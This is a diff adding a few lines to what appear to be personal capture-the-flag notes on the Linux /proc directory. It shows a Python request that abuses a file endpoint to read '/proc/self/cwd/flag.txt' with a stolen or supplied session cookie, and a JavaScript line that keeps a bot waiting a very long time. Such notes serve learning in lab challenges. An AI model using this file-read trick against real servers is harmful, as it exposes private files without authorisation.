@@ -22,3 +22,12 @@ The /proc directory is a special directory in Linux that provides an interface t
 It contains information about processes, system configuration, and other system-related details.
 
 Self is symlink to current process, cwd meads current working diirectory.
+
+So like: 
+
+```
+print(requests.request("GET", URL+"/api/file?filename=/proc/self/cwd/flag.txt", headers={'Cookie': f'session={session_cookie}'}).text)
+```
+
+- Making a bot run long:
+await new Promise((resolve) => setTimeout(resolve, 9999999));
